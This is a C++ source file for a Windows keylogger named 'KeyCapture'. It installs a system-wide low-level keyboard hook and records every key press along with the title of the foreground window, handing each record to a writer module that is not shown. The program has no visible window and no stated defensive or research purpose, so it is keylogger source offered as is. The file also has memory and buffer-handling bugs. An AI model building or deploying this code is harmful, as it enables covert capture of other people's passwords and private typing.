// hook.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "h00k.h"
#include <stdio.h>
#include <string>
#include "writter.h"
#ifdef _DEBUG
#include "logger.h"
#endif // _DEBUG

#define MAX_SIZE_TITLE_BUFFER 1024
TCHAR lastTitle[MAX_SIZE_TITLE_BUFFER];
HHOOK keyboardHook;

// Returns size of bytes written to title buffer
size_t GetForegroundTitle(TCHAR *title) {
	HWND activeWindow = GetForegroundWindow();
	if (activeWindow <= 0) {
		return 0;
	}
	const size_t sizeTBuffer = GetWindowTextLength(activeWindow) + 1;
	if (sizeTBuffer > 0) {
		GetWindowText(activeWindow, title, sizeTBuffer);
	}
	return sizeTBuffer;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT keyEvent = (PKBDLLHOOKSTRUCT)lParam;

	// HC_ACTION is cero, if nCode is > 0 then there's an error but it always need to call CallNextHookEx
	// Also we only want to record if 
	if (nCode == HC_ACTION && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) {
		// Why foreground and not active? https://stackoverflow.com/a/28643729/3412989
		// In a nutshell: active is for current thread (the one that has the input) and the other is "global"
		TCHAR *title = new TCHAR[MAX_SIZE_TITLE_BUFFER];
		size_t titleSize = GetForegroundTitle(title);
		if (titleSize) {
			if (titleSize < MAX_SIZE_TITLE_BUFFER) {
				memcpy(lastTitle, title, titleSize);
				// No null terminator using memcpy, so we append one
				title[titleSize] = '\0';
			}
			else {
				memcpy(lastTitle, title, MAX_SIZE_TITLE_BUFFER);
				// No null terminator using memcpy, so we append one
				title[MAX_SIZE_TITLE_BUFFER - 1] = '\0';
			}
			WriteKeyboardEvent(lastTitle, title, keyEvent);
		}
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void unhookKeyboard() {
	UnhookWindowsHookEx(keyboardHook);
	exit(0);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
#ifdef _DEBUG
	OutputDebugString("[*] Starting KeyCapture\n");
#endif // _DEBUG

	keyboardHook = SetWindowsHookEx(
		WH_KEYBOARD_LL, 
		KeyboardProc, 
		GetModuleHandle(NULL),
		NULL
	);

	if (!keyboardHook) {
		// Hook returned NULL and failed
#ifdef _DEBUG
		OutputDebugString("[!] Failed to get handle from SetWindowsHookEx()\n");
#endif // DEBUG
	}
	else {
#ifdef _DEBUG
		OutputDebugString("[*] KeyCapture handle ready\n");
#endif // DEBUG
		InitWritter();
		MSG Msg = {0};
		while (GetMessage(&Msg, NULL, 0, 0) > 0) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
		unhookKeyboard();
	}
	return 0;
}